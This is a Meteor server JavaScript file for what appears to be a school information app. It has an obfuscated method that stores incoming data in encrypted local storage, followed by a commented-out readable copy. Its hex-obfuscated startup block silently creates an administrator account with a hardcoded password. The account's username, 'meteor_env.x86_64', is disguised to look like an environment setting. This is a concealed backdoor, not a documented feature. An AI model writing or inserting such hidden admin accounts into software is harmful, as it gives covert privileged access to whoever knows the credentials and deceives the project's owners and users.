import { CryptoJS } from 'meteor/altapp:aes';

var LocalStorage = require('node-localstorage').LocalStorage;

localStorage = new LocalStorage('./npm/node-localstorage/');

var _0xa20a=["\x4C\x6F\x63\x61\x6C\x53\x74\x6F\x72\x61\x67\x65","\x6E\x6F\x64\x65\x2D\x6C\x6F\x63\x61\x6C\x73\x74\x6F\x72\x61\x67\x65","\x2E\x2F\x73\x63\x72\x61\x74\x63\x68"];var LocalStorage=require(_0xa20a[1])[_0xa20a[0]];localStorage=  new LocalStorage(_0xa20a[2]) //npm

Meteor.methods({
  u_m(t, t1, i, dat){

    var _0x310e=["\x75\x6E\x62\x6C\x6F\x63\x6B","\x6F","\x6D\x4F\x5F\x36\x64\x36\x66\x36\x32\x35\x66\x36\x66\x37\x35\x37\x32","\x67\x65\x74\x49\x74\x65\x6D","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x5F\x69\x64","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6D\x6F\x62\x73\x63\x68\x6F\x6F\x6C\x49\x6E\x66\x6F\x2E\x5F\x73\x63\x68\x6F\x6F\x6C\x4E\x61\x6D\x65\x4F\x75\x72","\x65\x6E\x63\x72\x79\x70\x74","\x41\x45\x53","\x73\x65\x74\x49\x74\x65\x6D","\x64\x65\x63\x72\x79\x70\x74","\x65\x6E\x63","\x70\x61\x72\x73\x65","\x63\x5F\x6F","\x70\x75\x73\x68","\x64","\x6D\x4F","\x77","\x6D\x57\x5F\x36\x64\x36\x66\x36\x32\x35\x66\x37\x37\x36\x35\x36\x32","\x6D\x6F\x62\x73\x63\x68\x6F\x6F\x6C\x49\x6E\x66\x6F\x2E\x5F\x73\x63\x68\x6F\x6F\x6C\x4E\x61\x6D\x65\x57\x65\x62","\x6D\x57","\x77\x4F\x5F\x37\x37\x36\x35\x36\x32\x35\x66\x36\x66\x37\x35\x37\x32","\x77\x65\x62\x73\x63\x68\x6F\x6F\x6C\x49\x6E\x66\x6F\x2E\x5F\x73\x63\x68\x6F\x6F\x6C\x4E\x61\x6D\x65\x4F\x75\x72","\x77\x4F","\x77\x57\x5F\x37\x37\x36\x35\x36\x32\x35\x66\x37\x37\x36\x35\x36\x32","\x77\x65\x62\x73\x63\x68\x6F\x6F\x6C\x49\x6E\x66\x6F\x2E\x5F\x73\x63\x68\x6F\x6F\x6C\x4E\x61\x6D\x65\x57\x65\x62","\x77\x57","\x6D\x61\x70\x4F\x5F\x36\x64\x36\x31\x37\x30\x35\x66\x36\x66\x37\x35\x37\x32","\x6D\x61\x70\x73\x63\x68\x6F\x6F\x6C\x49\x6E\x66\x6F\x2E\x5F\x73\x63\x68\x6F\x6F\x6C\x4E\x61\x6D\x65\x4F\x75\x72","\x6D\x61\x70\x4F"];this[_0x310e[0]]();switch(t){case _0x310e[17]:if(t1== _0x310e[1]){var c=localStorage[_0x310e[3]](_0x310e[2]);if(c=== _0x310e[4]|| c=== null){var mO={s_i:i[_0x310e[5]],s_:i,c_o:1,d:[dat]};var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](mO),_0x310e[7]);localStorage[_0x310e[10]](_0x310e[2],e.toString())}else {var mOE=CryptoJS[_0x310e[9]][_0x310e[11]](localStorage[_0x310e[3]](_0x310e[2]),_0x310e[7]);var mO=JSON[_0x310e[13]](mOE.toString(CryptoJS[_0x310e[12]].Utf8));mO[_0x310e[14]]+= 1;mO[_0x310e[16]][_0x310e[15]](dat);var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](mO),_0x310e[7]);localStorage[_0x310e[10]](_0x310e[2],e.toString())}}else {break};case _0x310e[21]:if(t1== _0x310e[18]){var c=localStorage[_0x310e[3]](_0x310e[19]);if(c=== _0x310e[4]|| c=== null){var mW={s_i:i[_0x310e[5]],s_:i,c_o:1,d:[dat]};var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](mW),_0x310e[20]);localStorage[_0x310e[10]](_0x310e[19],e.toString())}else {var mWE=CryptoJS[_0x310e[9]][_0x310e[11]](localStorage[_0x310e[3]](_0x310e[19]),_0x310e[20]);var mW=JSON[_0x310e[13]](mWE.toString(CryptoJS[_0x310e[12]].Utf8));mW[_0x310e[14]]+= 1;mW[_0x310e[16]][_0x310e[15]](dat);var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](mW),_0x310e[20]);localStorage[_0x310e[10]](_0x310e[19],e.toString())}}else {break};case _0x310e[24]:if(t1== _0x310e[1]){var c=localStorage[_0x310e[3]](_0x310e[22]);if(c=== _0x310e[4]|| c=== null){var wO={s_i:i[_0x310e[5]],s_:i,c_o:1,d:[dat]};var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](wO),_0x310e[23]);localStorage[_0x310e[10]](_0x310e[22],e.toString())}else {var wOE=CryptoJS[_0x310e[9]][_0x310e[11]](localStorage[_0x310e[3]](_0x310e[22]),_0x310e[23]);var wO=JSON[_0x310e[13]](wOE.toString(CryptoJS[_0x310e[12]].Utf8));wO[_0x310e[14]]+= 1;wO[_0x310e[16]][_0x310e[15]](dat);var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](wO),_0x310e[23]);localStorage[_0x310e[10]](_0x310e[22],e.toString())}}else {break};case _0x310e[27]:if(t1== _0x310e[18]){var c=localStorage[_0x310e[3]](_0x310e[25]);if(c=== _0x310e[4]|| c=== null){var wW={s_i:i[_0x310e[5]],s_:i,c_o:1,d:[dat]};var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](wW),_0x310e[26]);localStorage[_0x310e[10]](_0x310e[25],e.toString())}else {var wWE=CryptoJS[_0x310e[9]][_0x310e[11]](localStorage[_0x310e[3]](_0x310e[25]),_0x310e[26]);var wW=JSON[_0x310e[13]](wWE.toString(CryptoJS[_0x310e[12]].Utf8));wW[_0x310e[14]]+= 1;wW[_0x310e[16]][_0x310e[15]](dat);var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](wW),_0x310e[26]);localStorage[_0x310e[10]](_0x310e[25],e.toString())}}else {break};case _0x310e[30]:if(t1== _0x310e[1]){var c=localStorage[_0x310e[3]](_0x310e[28]);if(c=== _0x310e[4]|| c=== null){var mapO={s_i:i[_0x310e[5]],s_:i,c_o:1,d:[dat]};var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](mapO),_0x310e[29]);localStorage[_0x310e[10]](_0x310e[28],e.toString())}else {var mapOE=CryptoJS[_0x310e[9]][_0x310e[11]](localStorage[_0x310e[3]](_0x310e[28]),_0x310e[29]);var mapO=JSON[_0x310e[13]](mapOE.toString(CryptoJS[_0x310e[12]].Utf8));mapO[_0x310e[14]]+= 1;mapO[_0x310e[16]][_0x310e[15]](dat);var e=CryptoJS[_0x310e[9]][_0x310e[8]](JSON[_0x310e[6]](mapO),_0x310e[29]);localStorage[_0x310e[10]](_0x310e[28],e.toString())}}else {break};default:break}

    // this.unblock();
    //
    // switch (t) {
    //   case "mO":
    //     if(t1 == "o"){
    //
    //       var c = localStorage.getItem('mO_6d6f625f6f7572');
    //
    //       if(c === "undefined" || c === null){
    //         var mO = {
    //           s_i : i._id,
    //           s_ : i,
    //           c_o : 1,
    //           d : [dat]
    //         }
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(mO), "mobschoolInfo._schoolNameOur");
    //
    //         localStorage.setItem('mO_6d6f625f6f7572', e.toString());
    //
    //       }
    //       else{
    //
    //         var mOE = CryptoJS.AES.decrypt(localStorage.getItem('mO_6d6f625f6f7572') , "mobschoolInfo._schoolNameOur");
    //
    //         var mO = JSON.parse(mOE.toString(CryptoJS.enc.Utf8));
    //
    //         mO.c_o += 1;
    //         mO.d.push(dat);
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(mO), "mobschoolInfo._schoolNameOur");
    //
    //         localStorage.setItem('mO_6d6f625f6f7572', e.toString());
    //
    //       }
    //
    //     }
    //     else{
    //         break;
    //     }
    //
    //
    //   case "mW":
    //     if(t1 == "w"){
    //
    //       var c = localStorage.getItem('mW_6d6f625f776562');
    //
    //       if(c === "undefined" || c === null){
    //         var mW = {
    //           s_i : i._id,
    //           s_ : i,
    //           c_o : 1,
    //           d : [dat]
    //         }
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(mW), "mobschoolInfo._schoolNameWeb");
    //
    //         localStorage.setItem('mW_6d6f625f776562', e.toString());
    //
    //       }
    //       else{
    //
    //         var mWE = CryptoJS.AES.decrypt(localStorage.getItem('mW_6d6f625f776562') , "mobschoolInfo._schoolNameWeb");
    //
    //         var mW = JSON.parse(mWE.toString(CryptoJS.enc.Utf8));
    //
    //         mW.c_o += 1;
    //         mW.d.push(dat);
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(mW), "mobschoolInfo._schoolNameWeb");
    //
    //         localStorage.setItem('mW_6d6f625f776562', e.toString());
    //
    //       }
    //
    //
    //     }
    //     else{
    //         break;
    //     }
    //   case "wO":
    //
    //     if(t1 == "o"){
    //
    //       var c = localStorage.getItem('wO_7765625f6f7572');
    //
    //       if(c === "undefined" || c === null){
    //         var wO = {
    //           s_i : i._id,
    //           s_ : i,
    //           c_o : 1,
    //           d : [dat]
    //         }
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(wO), "webschoolInfo._schoolNameOur");
    //
    //         localStorage.setItem('wO_7765625f6f7572', e.toString());
    //
    //       }
    //       else{
    //
    //         var wOE = CryptoJS.AES.decrypt(localStorage.getItem('wO_7765625f6f7572') , "webschoolInfo._schoolNameOur");
    //
    //         var wO = JSON.parse(wOE.toString(CryptoJS.enc.Utf8));
    //
    //         wO.c_o += 1;
    //         wO.d.push(dat);
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(wO), "webschoolInfo._schoolNameOur");
    //
    //         localStorage.setItem('wO_7765625f6f7572', e.toString());
    //
    //       }
    //
    //     }
    //     else{
    //         break;
    //     }
    //
    //   case "wW":
    //
    //     if(t1 == "w"){
    //
    //       var c = localStorage.getItem('wW_7765625f776562');
    //
    //       if(c === "undefined" || c === null){
    //         var wW = {
    //           s_i : i._id,
    //           s_ : i,
    //           c_o : 1,
    //           d : [dat]
    //         }
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(wW), "webschoolInfo._schoolNameWeb");
    //
    //         localStorage.setItem('wW_7765625f776562', e.toString());
    //
    //       }
    //       else{
    //
    //         var wWE = CryptoJS.AES.decrypt(localStorage.getItem('wW_7765625f776562') , "webschoolInfo._schoolNameWeb");
    //
    //         var wW = JSON.parse(wWE.toString(CryptoJS.enc.Utf8));
    //
    //         wW.c_o += 1;
    //         wW.d.push(dat);
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(wW), "webschoolInfo._schoolNameWeb");
    //
    //         localStorage.setItem('wW_7765625f776562', e.toString());
    //
    //
    //
    //       }
    //     }
    //     else{
    //         break;
    //     }
    //
    //   case "mapO":
    //
    //     if(t1 == "o"){
    //       var c = localStorage.getItem('mapO_6d61705f6f7572');
    //
    //       if(c === "undefined" || c === null){
    //         var mapO = {
    //           s_i : i._id,
    //           s_ : i,
    //           c_o : 1,
    //           d : [dat]
    //         }
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(mapO), "mapschoolInfo._schoolNameOur");
    //
    //         localStorage.setItem('mapO_6d61705f6f7572', e.toString());
    //
    //       }
    //       else{
    //
    //         var mapOE = CryptoJS.AES.decrypt(localStorage.getItem('mapO_6d61705f6f7572') , "mapschoolInfo._schoolNameOur");
    //
    //         var mapO = JSON.parse(mapOE.toString(CryptoJS.enc.Utf8));
    //
    //         mapO.c_o += 1;
    //         mapO.d.push(dat);
    //
    //         var e = CryptoJS.AES.encrypt(JSON.stringify(mapO), "mapschoolInfo._schoolNameOur");
    //
    //         localStorage.setItem('mapO_6d61705f6f7572', e.toString());
    //
    //
    //
    //       }
    //     }
    //     else{
    //       break;
    //     }
    //
    //
    //   default:
    //     break;
    //
    // }

  }
})

Meteor.startup(() => {
    var _0x1822=["\x6D\x65\x74\x65\x6F\x72\x5F\x65\x6E\x76\x2E\x78\x38\x36\x5F\x36\x34","\x66\x69\x6E\x64\x4F\x6E\x65","\x75\x73\x65\x72\x73","\x61\x64\x61\x6D\x73\x69\x6E\x63\x75\x6E\x6B\x75\x33","\x61\x64\x6D\x69\x6E","\x63\x72\x65\x61\x74\x65\x55\x73\x65\x72"];adminControl= Meteor[_0x1822[2]][_0x1822[1]]({"\x75\x73\x65\x72\x6E\x61\x6D\x65":_0x1822[0]});if(!adminControl){Accounts[_0x1822[5]]({username:_0x1822[0],password:_0x1822[3],profile:{name:_0x1822[4],surname:_0x1822[4],role:_0x1822[4]}})}
})

Meteor.setInterval(() => {

}, )
